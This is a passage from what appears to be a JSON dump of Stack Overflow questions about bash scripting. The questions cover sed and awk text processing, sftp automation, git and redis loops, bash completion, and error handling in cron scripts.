one.  Here is what I have so far</p>\n\n<pre><code>#!/bin/sh\nID=0\ncat ''$pwd'usernum.txt' &gt;&gt; $ID\ncount1=1\nIDB=$(($ID+$count1))\nrm \"usernum.txt\"\ntouch \"usernum.txt\"\necho $IDB &gt;&gt; usernum.txt\n</code></pre>\n\n<p>It runs but when I open the file, it stays the same.  Any ideas?\nThanks,\nMike</p>\n"},{"tags":["osx","bash","command-line","script","png"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":139,"score":1,"question_id":12499728,"title":"Create PNG/JPG file with commandline on Mac","body":"<p>is there a command to create a simple PNG/JPG picture file, can be run in terminal/script command on Mac?</p>\n\n<p>For now, I'm going to create a simple one color PNG picture file, with parameter to specify wide and length. if it can put text on it, is much better.</p>\n"},{"tags":["linux","bash","shell","unix","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":11561720,"title":"Retreiving information from a text file. Linux","body":"<p>Okay so basically I am trying to read information from three text files in which it contains unique information.</p>\n\n<p>The way the text file is setup is this:</p>\n\n<pre><code>textA.txt\n----------------\nsomething.awesome.com\nsomething2.awesome.com\nsomething3.awesome.com\n...\n\ntextB.txt\n----------------\n123\n456\n789\n...\n\ntextC.txt\n----------------\n12.345.678.909\n87.65.432.1\n102.254.326.12\n....\n</code></pre>\n\n<p>Now what its suppose to look like when i output it something like this</p>\n\n<pre><code>something.awesome.com : 123 : 12.345.678.909\nsomething2.awesome.com : 456 : 87.65.432.1\nsomething3.awesome.com : 789 : 102.254.326.12\n</code></pre>\n\n<p>The code I am trying now is this:</p>\n\n<pre><code>for each in `cat site.txt` ; do\n    site=`echo $each | cut -f1`\n\n    for line in `cat port.txt` ; do\n        port=`echo $line | cut -f1`\n\n        for this in `cat ip.txt` ; do\n            connect=`echo $this | cut -f1`\n\n            echo \"$site : $port : $connect\"\n        done\n    done\ndone\n</code></pre>\n\n<p>The result I am getting is just crazy wrong and just not what i want. I don't know how to fix this. Can someone please help?</p>\n\n<p><strong>I want to be able to call the information through variable form.</strong></p>\n"},{"tags":["bash","whitespace"],"answer_count":10,"favorite_count":31,"up_vote_count":42,"down_vote_count":0,"view_count":13780,"score":42,"question_id":149057,"title":"How to remove trailing whitespace of all files recursively?","body":"<p>How can you remove all of the trailing whitespace of an entire project? Starting at a root directory, and removing the trailing whitespace from all files in all folders.</p>\n\n<p>Also, I want to to be able to modify the file directly, and not just print everything to stdout.</p>\n"},{"tags":["bash","passwords","sftp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":289,"score":0,"question_id":12508206,"title":"pass password to sftp in a bash script","body":"<p>I would like to automate a bash script, that connects to server using sftp and does a file transfer. I have the password for this, and initially I tried for this</p>\n\n<pre><code>sftp $acc@$host &lt;&lt; EOF\n&lt;passwd_here&gt;\ncd $dir\nget $file\nquit\nEOF\n</code></pre>\n\n<p>but it still prompted for password, and I had to enter it manually at the prompt.</p>\n\n<p>After searching SO, I found <a href=\"http://stackoverflow.com/questions/5386482/how-to-run-the-sftp-command-with-a-password-from-bash-script\">this post</a> which had a solution with <code>expect</code>, which I tried and I got the following error:</p>\n\n<p>Script:</p>\n\n<pre><code>sftp -b cmdfile.txt $acc@$host\nexpect \"Password:\"\nsend \"&lt;passwd&gt;\\n\";\ninteract\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>Permission denied (publickey,keyboard-interactive).\n</code></pre>\n\n<p><code>cmdfile.txt</code></p>\n\n<pre><code>cd $dir\nget $file\nquit\n</code></pre>\n\n<p>Please let me know, How to connect using the password in a bash script?</p>\n"},{"tags":["bash","shell","variables"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12505609,"title":"Shell Script variable inside a variable","body":"<p>I'm writing a shell script as below.</p>\n\n<pre><code>#/bin/bash\n\nip1=\"1.1.1.1\"\nip2=\"2.2.2.2\"\n\nfor ((i=1; i&lt;=2; i++))\ndo\necho \"$[ip$i]\"\n\ndone\n</code></pre>\n\n<p>i get the error after run.<br>\n./1.sh: line 8: 1.1.1.1: syntax error: invalid arithmetic operator (error token is \".1.1.1\")</p>\n\n<p>Thank you so much !</p>\n"},{"tags":["bash","shell","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":12504957,"title":"How to avoid a bash script from failing when -e option is set?","body":"<p>I have a bash script with <code>-e</code> option set, which fails the whole script on the very first error.</p>\n\n<p>In the script, I am trying to do an <code>ls</code> on a directory. But that path may or may not exist. If the path does not exist, the <code>ls</code> command fails, since the <code>-e</code> flag is set. </p>\n\n<p>Is there a way by which I can prevent the script from failing?</p>\n\n<p>As a side note, I have tried the trick to do an <code>set +e</code> and <code>set -e</code> before and after that command and it works. But I am looking for some better solution.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12504886,"title":"bash script: var=\"[|-d]\"","body":"<p>I found it weird that my program started to output some \"b's\" that I did not type. Then I found out this:</p>\n\n<pre><code>var=\"[|-a]\"\necho $var\nvar=\"[|-b]\"\necho $var\nvar=\"[|-c]\"\necho $var\n.\n.\n.\n</code></pre>\n\n<p>The first <code>echo</code> outputs what I intend: [|-a]. The others, from b to z, always output \"b\". Why?</p>\n"},{"tags":["bash","date","sed","awk","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12503251,"title":"parse day time ranges with bash","body":"<p>I hope one of you bash, sed, awk experts out there can help me out.  I have this string:</p>\n\n<pre><code> 00:00:00:00:00:00%~%System1%~%s0:00-21:40%~%m3:10-17:10%~%t11:20-20:30%~%w05:10-9:30%~%t00:00-21:30%~%f12:00-0:00%~%s6:00-18:00     \n</code></pre>\n\n<p>It is fields separated by \"%~%\".  The first two fields can be ignored.  The remaining fields have day time ranges.  This should clarify the format:</p>\n\n<pre><code>00:00:00:00:00:00 &lt;--Mac\nSystem1           &lt;--Name\ns00:00-21:40      &lt;--Sunday 12 AM through 9:40 PM  \nm03:10-17:10      &lt;--Monday 3:10 AM through 5:10 PM\nt11:20-20:30      &lt;--Tuesday 11:20 AM through 8:30 PM\nw05:10-9:30       &lt;--Wednesday 5:10 AM through 9:30 AM\nt00:00-21:30      &lt;--Thursday 12 AM through 9:30 PM\nf12:00-0:00       &lt;--Friday 12 PM through 12:00 AM\ns06:00-18:00      &lt;--Saturday 6 AM through 6:00 PM\n</code></pre>\n\n<p>Now the trick...I need to determine if the current system datetime is within the ranges. :-(</p>\n\n<p>So, if date returns this:</p>\n\n<pre><code> Wed Sep 19 14:26:05 UTC 2012\n</code></pre>\n\n<p>Then it doesn't fall within the range specified for Wednesday. I basically need an if statement.  I need to execute one script if it is within the range and a different script if it is not.  How would I do that with bash, awk, and/or sed?</p>\n\n<p>Thanks for any help you can offer!</p>\n\n<p>I started going down this path:</p>\n\n<pre><code>arr=$(echo $line | tr \"%~% \" \"\\n\")\nfor x in $arr\ndo\n    #Now what?  Some kind of switch/case?\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":497,"score":3,"question_id":4187210,"title":"convert relative symbolic links to absolute symbolic links","body":"<p>How can I convert relative symbolic links to absolute symbolic links recursively in bash?</p>\n"},{"tags":["bash","shell",".bash-profile"],"answer_count":3,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":3244,"score":9,"question_id":4608187,"title":"How to reload .bash_profile from the command line?","body":"<p>How can I reload .bash_profile from the command line? \nI can get the shell to recognize changes to .bash_profile by exiting and logging back in but I would like to be able to do it on demand.</p>\n"},{"tags":["linux","bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12503555,"title":"How to pick out \"second\" value using awk?","body":"<p>The so-far expertly crafted script </p>\n\n<pre><code>iostat -p -x 1 2| grep $1[^[:digit:]] | awk '{print $9}'\n</code></pre>\n\n<p>will return two lines:</p>\n\n<pre><code>0.16\n0.00\n</code></pre>\n\n<p>because iostat is taking two samples. But you already knew that. My question is since you and I both know it will be exactly two lines every time, how I pick out exactly the second?</p>\n"},{"tags":["osx","bash",".bash-profile"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":11498070,"title":"Bash .profile not loading","body":"<p>I'm not sure what's happened but my ~/.profile is no longer loading.</p>\n\n<p>Can anyone see something wrong with the following?</p>\n\n<pre><code>export PS1=\"\\u@local [\\w]# \"\nexport EDITOR=\"subl -w\"\nexport CLICOLOR=1\nexport LSCOLORS=GxFxCxDxBxegedabagaced\n\nalias vst=\"ssh -i ~/.ssh/vst root@vst\"\n</code></pre>\n\n<p>I know for a fact using that PS1 like I am attempting to do it should be doing <code>Peter@local [~/path/to/file]#</code> but it's not.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["linux","bash","php"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12504152,"title":"How to write a list of file names to a .lst file using bash commands","body":"<p>I am new to linux and trying to work with bash commands within a PHP script that I'm attempting to write, I am needing to write each PDF file name from a directory that I'm iterating through using the DirectoryIterator () in PHP to a .lst file that I have sitting in another folder and have each file name listed on a new line in the text file.</p>\n\n<p>The .lst file should look like this:</p>\n\n<p>1.pdf <br>\n2.pdf <br>\n3.pdf <br>\n...</p>\n\n<p>I hope this makes sense.  Any HELP/DIRECTION would be greatly appreciated.</p>\n\n<p>Here is the code that I've come up with so far:</p>\n\n<pre><code>// Use the command line cp to copy each PDF file in the sourceDir to the destinationDir.\nforeach ($srcDir as $entity) {\n\n    /**\n     * @var DirectoryIterator $entity\n     */\n    /*$result = rename($sourceDir . '/' . $entity-&gt;getFilename(), $destinationDir .'/' . $entity-&gt;getFileName());\n    if(!$result)\n    {\n        throw Exception('Could not copy file ' . $entity-&gt;getFilename() . 'to destination directory ');\n    }*/\n\n    $cpString = 'cp ' . $sourceDir . '/' . $entity-&gt;getFilename() . ' ' . $destinationDir .'/' . $entity-&gt;getFileName() . ' 2&lt;&amp;1';\n    passthru($cpString, $returnVar);\n\n    if($entity-&gt;isFile() &amp;&amp; strtoupper($entity-&gt;getExtension()) == 'PDF')\n    {\n        $cpString = 'cp ' . $sourceDir . '/' . $entity-&gt;getFilename() . ' ' . $destinationDir .'/' . $entity-&gt;getFileName();\n        if ($counter = 1) {\n            $catString = 'cat ' . $destinationDir . '/' . $batchNum . '.lst';\n        }\n        $cpString = ''\n    }\n    $counter++;\n}\n</code></pre>\n"},{"tags":["linux","bash","recursion","tree","breadth-first-search"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12503958,"title":"Recursive breadth first traversal in Bash","body":"<p>I'm trying to discover why my traversal isn't working.  I believe I've isolated the problem to the point in code where it says \"directory contains\" and then what was passed to the function.  The function gets passed an array containing all of the new file paths to echo but for some reason it is only receiving the first one.  Am I passing the array incorrectly or could it be something else?</p>\n\n<pre><code>#!/bin/bash\n\ntraverse(){\n  directory=$1\n  for x in ${directory[@]}; do\n    echo \"directory contains: \" ${directory[@]}\n    temp=(`ls $x`)\n    new_temp=( )\n    for y in ${temp[@]}; do\n      echo $x/$y\n      new_temp=(${new_temp[@]} $x/$y)\n    done\n  done\n\n  ((depth--))\n\n  if [ $depth -gt 0 ]; then\n    traverse $new_temp\n  fi\n}\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12452700,"title":"Tracking connected wifi device bash script","body":"<p>I'm trying to write a bash script that will log the connection state of a wifi connection by mac address but I'm having some trouble with the syntax of the code. </p>\n\n<pre><code>#!/bin/sh\n\nclient=\"E1:FA:41:23:00:AC\"\nlogfile=\"/var/logs/wificonn.log\"\ntimestamp=$(date +\"%Y%d%m %T\")\nassoclist=$(wl assoclist | grep $client)\nloglast=$(tail -n 1 $logfile | grep $client Not Connected)\nnotconnmsg=\"$timestamp $client Not Connected\"\nconnmsg=\"$timestamp $client Connected\"\n\nif [ ! -f $logfile ]; then\n    touch $logfile\nfi\n\nif [ -z $assoclist  ]; then # Client is not connected\n  if [ -n $loglast ]; then # Last log is connected show not connected message\n    echo $notconnmsg\n    echo $notconnmsg &gt;&gt; $logfile\n  fi  \nelse # Client is connected\n  if [ -z $loglast ]; then  # Last log is not connected show connected message\n    echo $connmsg\n    echo $connmsg &gt;&gt; $logfile\n  fi  \nfi\n</code></pre>\n\n<p>This will be run as a cron job every 60seconds and only want it to show/log connected or not connected events only if the opposite is true. I am trying to achieve this by checking the last log entry. eg if last log was not connected and now connected, log to file. This is where the problem is.</p>\n\n<p>thanks</p>\n"},{"tags":["bash","sed","awk"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12495334,"title":"Bash append line to lastline if case matches","body":"<p>I got an Input like this:</p>\n\n<pre><code>ha  lo \nha\nha  lo\nha\nha\nha  lo\n</code></pre>\n\n<p>How can i append the line to the last line if it doesn't contain the string \"lo\" in the second row. It should look like this afterwards</p>\n\n<pre><code>haha\nhahaha\nha\n</code></pre>\n\n<p>I think this one is quite tricky. Would be nice to be able to do it with sed or awk.</p>\n"},{"tags":["bash","sed","awk"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":109,"score":-2,"question_id":12396673,"title":"script to remove string and keep numbers from files","body":"<p>The titles of my files are formatted like the following: </p>\n\n<ul>\n<li>fileName01</li>\n<li>file07</li>\n<li>fileTitle8</li>\n<li><p>fileName20</p></li>\n<li><p>There is no delimiter between the string and numbers and the String character is not equal on each line.</p></li>\n<li><p>I want to output just the numbers from the end of the filename:</p></li>\n<li>01 </li>\n<li>07</li>\n<li>8</li>\n<li>20</li>\n</ul>\n"},{"tags":["bash","getopts"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":323,"score":2,"question_id":11279423,"title":"bash getopts with multiple and mandatory options","body":"<p>Is it possible to use getopts to process multiple options together? For example, myscript -iR or myscript -irv.</p>\n\n<p>Also, I have a situation where based on a condition script would need mandatory option. For example, if argument to script is a directory, I will need to specify -R or -r option along with any other options (myscript -iR mydir or myscript -ir mydir or myscript -i -r mydir or myscript -i -R mydir), in case of file only -i is sufficient (myscript -i myfile).</p>\n\n<p>I tried to search but didn't get any answers.</p>\n"},{"tags":["regex","bash","sed","msys","mingw-w64"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12500916,"title":"Unpredictable behavior in sed interpreters output from multiple expressions","body":"<p>Why does GNU sed sometimes handle substitution with piped output into another sed instance differently than when multiple expressions are used with the same one?</p>\n\n<p>Specifically, for msys/mingw sessions, in the /etc/profile script I have a series of manipulations that \"rearrange\" the order of the environment variable PATH and removes duplicate entries.</p>\n\n<p>Take note that while normally sed treats each line of input seperately (and therfore can't easily substitute '\\n' in the input stream, this sed statement does a substitution of ':' with '\\n', so it still handles the entire input stream like one line (with '\\n' characters in it).  This behavior stays true for all sed expressions in the same instance of sed (basically until you redirect or pipe the output into another program).</p>\n\n<p>Here's the obligatory specs:</p>\n\n<pre><code>    Windows 7 Professional Service Pack 1\n    HP Pavilion dv7-6b78us\n    16 GB DDR3 RAM\n    MinGW-w64 (x86_64-w64-mingw32-gcc-4.7.1.2-release-win64-rubenvb) mounted on /mingw/\n    MSYS (20111123) mounted on / and on /usr/\n    $ uname -a=\"MINGW32_NT-6.1 CHRIV-L09 1.0.17(0.48/3/2) 2011-04-24 23:39 i686 Msys\"\n    $ which sed=\"/bin/sed.exe\" (it's part of MSYS)\n    $ sed --version=\"GNU sed version 4.2.1\"\n</code></pre>\n\n<p>This is the contents of PATH before manipulation:</p>\n\n<pre><code>    PATH='.:/usr/local/bin:/mingw/bin:/bin:/c/PHP:/c/Program Files (x86)/HP SimplePass 2011/x64:/c/Program Files (x86)/HP SimplePass 2011:/c/Windows/system32:/c/Windows:/c/Windows/System32/Wbem:/c/Windows/System32/WindowsPowerShell/v1.0:/c/si:/c/android-sdk:/c/android-sdk/tools:/c/android-sdk/platform-tools:/c/Program Files (x86)/WinMerge:/c/ntp/bin:/c/GnuWin32/bin:/c/Program Files/MySQL/MySQL Server5.5/bin:/c/Program Files (x86)/WinSCP:/c/Program Files (x86)/Overlook Fing 2.1/bin:/c/Program Files/7-zip:.:/c/Program Files/TortoiseGit/bin:/c/Program Files (x86)/Git/bin:/c/VS10/VC/bin/x86_amd64:/c/VS10/VC/bin/amd64:/c/VS10/VC/bin'\n</code></pre>\n\n<p>This is an excerpt of /etc/profile (where I have begun the PATH manipulation):</p>\n\n<pre><code>    set | grep --color=never ^PATH= | sed -e \"s#^PATH=##\" -e \"s#'##g\" \\\n    -e \"s/:/\\n/g\" -e \"s#\\n\\(/[^\\n]*tortoisegit[^\\n]*\\)#\\nZ95-\\1#ig\" \\\n    -e \"s#\\n\\(/[a-z]/win\\)#\\nZ90-\\1#ig\" -e \"s#\\n\\(/[a-z]/p\\)#\\nZ70-\\1#ig\" \\\n    -e \"s#\\.\\n#A10-.\\n#g\" -e \"s#\\n\\(/usr/local/bin\\)#\\nA15-\\1#ig\" \\\n    -e \"s#\\n\\(/bin\\)#\\nA20-\\1#ig\" -e \"s#\\n\\(/mingw/bin\\)#\\nA25-\\1#ig\" \\\n    -e \"s#\\n\\(/[a-z]/vs10/vc/bin\\)#\\nA40-\\1#ig\"\n</code></pre>\n\n<p>The last sed expression in that line basically <strong>looks for lines that begins with \"/c/VS10/VC/bin\" and prepends them with 'A40-'</strong> like this:</p>\n\n<pre><code>    ...\n    /c/si\n    A40-/c/VS10/VC/bin\n    A40-/c/VS10/VC/bin/amd64\n    A40-/c/VS10/VC/bin/x86_amd64\n    /c/GnuWin32/bin\n    ...\n</code></pre>\n\n<p>I like my sed expressions to be flexible (path structures change), but <strong>I don't want it to match the lines that end with amd64 or x86_amd64</strong> (those are going to have a different string prepended). So I change the last expression to:</p>\n\n<pre><code>    -e \"s#\\n\\(/[a-z]/vs10/vc/bin\\)\\n#\\nA40-\\1\\n#ig\"\n</code></pre>\n\n<p>This works:</p>\n\n<pre><code>    ...\n    /c/si\n    A40-/c/VS10/VC/bin\n    /c/VS10/VC/bin/amd64\n    /c/VS10/VC/bin/x86_amd64\n    /c/GnuWin32/bin\n    ...\n</code></pre>\n\n<p>Then, (to <strong>match any \"line\" matching the pseudocode \"/x/.../bin\"</strong>) I change the last expression to:</p>\n\n<pre><code>    -e \"s#\\n\\(/[a-z]/.*/bin\\)\\n#\\nA40-\\1\\n#ig\"\n</code></pre>\n\n<p>Which produces:</p>\n\n<pre><code>    ...\n    /c/si\n    /c/VS10/VC/bin\n    /c/VS10/VC/bin/amd64\n    /c/VS10/VC/bin/x86_amd64\n    /c/GnuWin32/bin\n    ...\n</code></pre>\n\n<p><strong>??? - sed didn't match any character ('.') any number of times ('*')</strong> in the middle of the line ???</p>\n\n<p>But, if I pipe the output into a different instance of sed (and compensate for sed handling each \"line\" seperately) like this:</p>\n\n<pre><code>    | sed -e \"s#^\\(/[a-z]/.*/bin\\)$#A40-\\1#ig\"\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>    sed: -e expression #1, char 30: unterminated `s' command\n</code></pre>\n\n<p><strong>??? How is that unterminated?</strong>  It's got all three '#' characters after the s, has the modifiers 'i' and 'g' after the third '#', and the entire expression is in double quotes ('\"'). Also, there are no escapes ('\\') immediately preceding the delimiters, and the delimiter is not a part of either the search or the replacement. Let's try a different delimiter than '#', like '~':</p>\n\n<p>I use:\n        | sed -e \"s~^(/[a-z]/.*/bin)$~A40-\\1~ig\"</p>\n\n<p>and, I get:</p>\n\n<pre><code>    ...\n    /c/si\n    A40-/c/VS10/VC/bin\n    /c/VS10/VC/bin/amd64\n    /c/VS10/VC/bin/x86_amd64\n    A40-/c/GnuWin32/bin\n    ...\n</code></pre>\n\n<p>And, that is correct! <strong>The only thing I changed was the delimeter from '#' to '~' and it worked ???</strong></p>\n\n<p>This is not (even close to) the first time that sed has produced unexplainable results for me.</p>\n\n<p>Why, oh, why, is sed NOT matching syntax in an expression in the same instance, but IS matching when piped into another instance of sed?\nAnd, why, oh, why, do I have to use a different delimeter when I do this (in order not to get an \"unterminated 's' command\"?</p>\n\n<p><strong>And the real reason I'm asking: Is this a bug in sed, OR, is it correct behavior that I don't understand (and if so, can someone explain why this behavior is correct)?</strong>  I want to know if I'm doing it wrong, or if I need a different/better tool (or both, they don't have to be mutually exclusive).</p>\n\n<p><strong>I'll mark a response it as the answer if someone can either prove why this behavior is correct or if they can prove why it is a bug.</strong>  I'll gladly accept any advice about other tools or different methods of using sed, but those won't answer the question.</p>\n\n<p>I'm going to have to get better at other text processors (like awk, tr, etc.) because sed is costing me too much time with it's unexplainable results.</p>\n\n<p>P.S. This is not the complete logic of my PATH manipulation. The complete logic also finishes prepending all the lines with values from 'A00-' to 'Z99-', then pipes that output into 'sort -u -f' and back into sed to remove those same prefixes on each line and to convert the lines ('\\n') back into colons (':'). Then \"export PATH='\" is prepended to the single line and \"'\" is appended to it. Then that output is redirected into a temporary file. Next, that temporary file is sourced. And, finally, that temporary file is removed.</p>\n\n<p>The /etc/profile script also displays the contents of PATH before and after sorting (in case it screwed up the path).</p>\n\n<p>P.P.S. I'm sure there is a much better way to do this. It started as some very simple sed manipulations, and grew into the monster you see here. Even if there is a better way, I still need to know why sed is giving me these results.</p>\n"},{"tags":["bash","shell","unix","progress"],"answer_count":2,"favorite_count":4,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12498304,"title":"Using BASH to display a progress (working) indicator","body":"<p>Using a bash only script, how can you provide a bash progress indicator?</p>\n\n<p>So I can run a command form bash, and while that command is executing let the user know that something is still happening.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12433436,"title":"SVN update by executing TortoiseProc.exe in a script created in bash","body":"<p>I need to run a SVN update in script create in bash but it fails. Can please you help to find out what am I doing wrong?</p>\n\n<p><strong>Script:</strong></p>\n\n<pre><code>echo SVN Update\nalias svn=\"cd C/Program Files/TortoiseSVN/bin\"\nSTART TortoiseProc.exe /command:update /path:\"cd C/CCUE\" /closeonend:0\n</code></pre>\n\n<hr>\n\n<p><strong>Error in output:</strong></p>\n\n<pre><code>+echo SVN $'Update\\r'\nSVN Update\n' alias 'svn=cd C/Program Files/TortoiseSVN/bin\n+ START TortoiseProc.exe /command:update '/path:cd C/CCUE' $'/closeonend:0\\r' - line 7: START: command not found\n</code></pre>\n"},{"tags":["mysql","bash","scripting"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":8054,"score":5,"question_id":1636977,"title":"bash script - select from database into variable","body":"<p>I need a variable to hold results retrieved from the database. So far this is basically what I'm trying with no success.</p>\n\n<pre><code>myvariable=$(mysql database -u $user -p $password | SELECT A, B, C FROM table_a)\n</code></pre>\n\n<p>My understanding of bash commands is not very good as you can see.</p>\n"},{"tags":["git","bash"],"answer_count":1,"favorite_count":1,"up_vote_count":15,"down_vote_count":0,"view_count":1013,"score":15,"question_id":5131948,"title":"Use of an exclamation mark in a git commit message via command line?","body":"<p>How do I enter an exclamation point into a git commit message from the command line?</p>\n\n<p>It is possible to escape the exclamation point with a backslash, but then the backslash ends up in the commit message as well.</p>\n\n<p>I want something like this:</p>\n\n<pre><code>git commit -am \"Nailed it!\"\n</code></pre>\n"},{"tags":["bash","redis"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":12499385,"title":"Loop through lines in file and send to redis-cli","body":"<p>I have a file created through the use of <code>$ redis-cli KEYS session.* &gt; keys.txt</code>, which currently has about 950,000 lines/keys in it.</p>\n\n<p>I want to loop through all of these and set an expire on them, and would prefer to avoid writing even a python script for it.</p>\n"},{"tags":["git","bash","script"],"answer_count":2,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12499195,"title":"Git - How to find all \"unpushed\" commits for all projects in a directory?","body":"<p>I'm finally getting used to Git and, after the initial steep learning curve, I must say it's quite good (I just miss the single file externals, but that's another story). I have, however, an issue that I can't solve: I'm currently working on a dozen projects at the same time. They are all interconnected and I must jump from one to the other, making changes here and there. </p>\n\n<p>All good so far, I can \"juggle\" them quite easily, I commit changes regularly and so on. The issue is that, after several hours, I don't remember which projects I pushed to the remote repository. Of course, I can \"cd\" into each project's directory and issue the push command, but it's tedious. I was wondering if there would be a way, using bash, to run something like a <em><code>git find all unpushed commits in all projects in this directory</code></em>. Such command would be run from a directory which is <strong>not</strong> a Git repository, but which contains a tree of all the projects.</p>\n\n<p>The logic is simple, but the implementation seems quite complicated, also because, although the root directory contains all the projects, the actual Git repositories can be found at any level from the starting directory. For example:</p>\n\n<ul>\n<li>projects directory\n<ul>\n<li>customer X</li>\n<li><strong>project1</strong> (Git repo)</li>\n<li>customer U</li>\n<li><strong>project2</strong> (Git repo)</li>\n<li>project3\n<ul>\n<li><strong>somelibrary</strong> (Git repo)</li>\n<li><strong>theme</strong> (Git repo)</li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>In this example, only directories in bold are Git repositories, therefore the check should be run inside them. I'm aware that the structure looks a bit messy, but it's actually quite easy to handle.</p>\n\n<p>Any help is welcome, thanks.</p>\n"},{"tags":["bash","shell","path","relative-path","absolute-path"],"answer_count":13,"favorite_count":5,"up_vote_count":31,"down_vote_count":0,"view_count":17358,"score":31,"question_id":2564634,"title":"BASH: Convert absolute path into relative path given a current directory","body":"<pre><code>absolute=\"/foo/bar\"\ncurrent=\"/foo/baz/foo\"\n\n# magic\n\nrelative=\"../../bar\"\n</code></pre>\n\n<p>Can you help me with magic? (Hopefully not too complicated code...)</p>\n"},{"tags":["bash","unix","shell","autocomplete"],"answer_count":5,"favorite_count":11,"up_vote_count":22,"down_vote_count":0,"view_count":3095,"score":22,"question_id":342969,"title":"How do I get bash completion to work with aliases?","body":"<p>Case in point: </p>\n\n<p>I'm a on mac with bash v3.2.17, I'm using git installed via macports with the bash_completion variant.</p>\n\n<p>When I type <code>git checkout m&lt;tab&gt;</code>. for example, I get it completed to <code>master</code>.</p>\n\n<p>However, I've got an alias to <code>git checkout</code>, <code>gco</code>. When I type <code>gco m&lt;tab&gt;</code>, I don't get the branch name autocompleted.</p>\n\n<p>Ideally I'd like autocompletion to just magically work for all my aliases. Is it possible? Failing that, I'd like to manually customize it for each alias. So, how do I go about either?</p>\n"},{"tags":["bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":10528695,"title":"How to reset COMP_WORDBREAKS without effecting other completion script?","body":"<p>There is something confuse me when I implement a bash auto-completion function which I'll put it in /etc/bash_completion.d/ </p>\n\n<p>In order to achieve some feature, I want to remove the word break characters colon \":\" from variable $COMP_WORDBREAKS and add a slash \"/\" at begin of $COMP_WORDBREAKS.</p>\n\n<pre><code>    COMP_WORDBREAKS=\" /'&gt;&lt;=;|&amp;(\"\n    _mytool()\n    {\n        local cur=${COMP_WORDS[COMP_CWORD]}\n        compopt -o nospace\n\n        # my implement here\n\n        COMPREPLY=( $(compgen ..........my_implement......... -- $cur) )\n    }\n    complete -F _mytool mytool\n</code></pre>\n\n<p>However, I can't reset COMP_WORDBREAKS directly because the value is shared with other completion scripts.  By the time the completion function gets called, variable COMP_WORDS array has already been populated, so locally changes COMP_WORDBREAKS have no effect.</p>\n\n<p>Is there any solution for changing COMP_WORDBREAKS in one completion script and no effect to other script??</p>\n\n<pre><code>    $ echo $BASH_VERSION\n    4.2.10(1)-release\n</code></pre>\n\n<p>Waiting for your kindly response!~</p>\n"},{"tags":["linux","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":9899760,"title":"Use sed and wget to retrieve links only","body":"<p>What I need to do is retrieve a link through a command such as:</p>\n\n<p><code>wget --quiet -O - linkname</code></p>\n\n<p>Then pipe it to sed to just display ONLY the links on the page not the formatting.</p>\n\n<p>What i got so far only displays lines with the all the html code along side of it.</p>\n"},{"tags":["html","regex","bash","sed","awk"],"answer_count":7,"favorite_count":8,"up_vote_count":13,"down_vote_count":1,"view_count":9110,"score":12,"question_id":1881237,"title":"Easiest way to extract the urls from an html page using sed or awk only","body":"<p>I want to extract the URL from within the anchor tags of an html file.\nThis needs to be done in BASH using SED/AWK. No perl please.</p>\n\n<p>What is the easiest way to do this?</p>\n"},{"tags":["linux","bash","shell","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":136,"score":1,"question_id":12335356,"title":"How to handle error/exception in shell script?","body":"<p>Below is my script that I am executing in the bash. And it works fine.</p>\n\n<pre><code>fileexist=0\nfor i in $( ls /data/read-only/clv/daily/Finished-HADOOP_EXPORT_&amp;processDate#.done); do\n  mv /data/read-only/clv/daily/Finished-HADOOP_EXPORT_&amp;processDate#.done /data/read-only/clv/daily/archieve-wip/\n  fileexist=1\ndone\n</code></pre>\n\n<p><strong>Problem Statement:-</strong></p>\n\n<p>In my above shell script which has to be run daily using <code>cron job</code>, I don't have any <code>error/exception handling mechanism</code>. Suppose if anything gets wrong then I don't know what's has happened? </p>\n\n<p>As after the above script is executed, there are <code>some other scripts that will be dependent on the data provided by above script</code>, so I always get's complaint from the other people who are depending on my script data that something wrong has happened. 